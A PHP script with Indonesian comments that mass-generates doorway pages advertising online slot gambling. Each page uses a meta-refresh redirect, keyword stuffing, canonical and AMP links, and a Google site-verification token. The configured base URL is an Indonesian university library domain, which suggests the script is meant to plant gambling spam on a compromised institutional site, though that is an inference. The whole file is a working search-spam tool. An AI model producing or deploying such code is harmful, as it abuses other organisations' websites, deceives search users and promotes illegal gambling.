<?php
// Pembuat: SEO KAMPUNGAN //
// Dibuat pada: 11 Agustus 2025 //
// Deskripsi: Skrip untuk menghasilkan halaman web statis dengan redirect //
// Konfigurasi
$config = [
    'brandFile' => 'brand.txt',
    'deskripsiFile' => 'deskripsi.txt',
    'keywordsFile' => 'keywords.txt',
    'outputDir' => __DIR__ . '/public',
    'templateFile' => 'template.html',
    'baseUrl' => rtrim('https://opac.handayani.ac.id', '/'), // Hilangkan trailing slash
    'urltujuan' => 'https://opac.handayani.ac.id',
    'urlcanonical' => 'https://opac.handayani.ac.id',
    'urlamp' => 'https://amp-ensign-edu-sa.pages.dev',
    'googlesite' => 'hPWMZJCsXUESr2aNUuR1HnuGNwjjzIZg-TTVNg2K8kg',
    'createHtaccess' => true,
    'createRobotsTxt' => true,
    'createSitemap' => true,
    'generateFavicon' => true,
];

// Template default dengan redirect
$defaultTemplate = '<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="refresh" content="0;url={urltujuan}">
  <meta name="description" content="{deskripsi}">
  <meta name="keywords" content="{keywords}">
  <meta name="robots" content="noindex, nofollow">
  <link rel="canonical" href="{urlcanonical}">
  <link rel="amphtml" href="{urlamp}">
  <meta name="google-site-verification" content="{googlesite}">
  <title>{brand} - Taruhan Situs Judi Taruhan Slot {brand} Terbaik & Terpercaya di Tahun 2025</title>
</head>
<body>
  <p>Redirecting ke <a href="{urltujuan}">{urltujuan}</a>...</p>
</body>
</html>';

// Static files
$htaccessTemplate = "Options -Indexes\n<FilesMatch \"^\.\">\nDeny from all\n</FilesMatch>";
$robotsTxt = "User-agent: *\nAllow: /\n";
$sitemapEntries = [];

// Pemeriksaan file
$requiredFiles = [$config['brandFile'], $config['deskripsiFile'], $config['keywordsFile'], $config['templateFile']];
foreach ($requiredFiles as $file) {
    if (!file_exists($file) || filesize($file) === 0) {
        die("❌ File $file tidak ditemukan atau kosong.\n");
    }
}

// Baca file
$brands = file($config['brandFile'], FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
$deskripsiList = file($config['deskripsiFile'], FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
$keywordsList = file($config['keywordsFile'], FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

// Template
$template = file_exists($config['templateFile']) && filesize($config['templateFile']) > 0 
    ? file_get_contents($config['templateFile']) 
    : $defaultTemplate;

// Output dir
if (!is_dir($config['outputDir']) && !mkdir($config['outputDir'], 0755, true)) {
    die("❌ Gagal membuat direktori {$config['outputDir']}.\n");
}

// Generate per brand
foreach ($brands as $i => $brand) {
    $brand = trim($brand);
    if ($brand === '') continue;

    // Sanitasi nama folder
    $folderName = preg_replace('/[^a-z0-9-]/', '-', strtolower(str_replace(' ', '-', $brand)));
    $targetDir = $config['outputDir'] . '/' . $folderName;

    // Buat folder
    if (!is_dir($targetDir) && !mkdir($targetDir, 0755, true)) {
        echo "❌ Gagal membuat folder $folderName.\n";
        continue;
    }

    // Deskripsi dan keywords
    $deskripsi = isset($deskripsiList[$i]) ? trim($deskripsiList[$i]) : "$brand adalah situs terpercaya penyedia game slot terbaik.";
    $keywords = isset($keywordsList[$i]) ? trim($keywordsList[$i]) : "$brand, slot online, situs slot terpercaya";

    // Ganti tag dalam template
    $html = str_replace(
        ['{brand}', '{deskripsi}', '{keywords}', '{urltujuan}', '{urlcanonical}', '{urlamp}', '{googlesite}'],
        [
            htmlspecialchars($brand),
            htmlspecialchars($deskripsi),
            htmlspecialchars($keywords),
            htmlspecialchars($config['urltujuan']),
            htmlspecialchars($config['urlcanonical']),
            htmlspecialchars($config['urlamp']),
            htmlspecialchars($config['googlesite']),
        ],
        $template
    );

    // Simpan file index.html
    if (!file_put_contents($targetDir . '/index.html', $html)) {
        echo "❌ Gagal menyimpan index.html di $folderName.\n";
        continue;
    }

    // Buat .htaccess
    if ($config['createHtaccess'] && !file_put_contents($targetDir . '/.htaccess', $htaccessTemplate)) {
        echo "❌ Gagal menyimpan .htaccess di $folderName.\n";
    }

    // Buat robots.txt
    if ($config['createRobotsTxt'] && !file_put_contents($targetDir . '/robots.txt', $robotsTxt)) {
        echo "❌ Gagal menyimpan robots.txt di $folderName.\n";
    }

    // Generate favicon
    if ($config['generateFavicon'] && !empty($brand)) {
        $svg = '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16"><rect width="16" height="16" fill="#000"/><text x="8" y="12" font-size="10" text-anchor="middle" fill="#fff">' . strtoupper($brand[0]) . '</text></svg>';
        if (!file_put_contents($targetDir . '/favicon.svg', $svg)) {
            echo "❌ Gagal menyimpan favicon.svg di $folderName.\n";
        }
    }

    // Tambahkan ke sitemap
    if ($config['createSitemap']) {
        $sitemapEntries[] = "    <url>\n        <loc>{$config['baseUrl']}/public/{$folderName}/</loc>\n        <lastmod>" . date('Y-m-d') . "</lastmod>\n    </url>";
    }

    echo "✅ Folder dibuat: $folderName\n";
}

// Sitemap
if ($config['createSitemap'] && !empty($sitemapEntries)) {
    $sitemap = '<?xml version="1.0" encoding="UTF-8"?>' . "\n";
    $sitemap .= '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . "\n";
    $sitemap .= implode("\n", $sitemapEntries) . "\n";
    $sitemap .= '</urlset>';
    if (!file_put_contents($config['outputDir'] . '/sitemap.xml', $sitemap)) {
        echo "❌ Gagal menyimpan sitemap.xml.\n";
    } else {
        echo "🗺️ Sitemap berhasil dibuat.\n";
    }
}


echo "🎉 Proses selesai.\n";
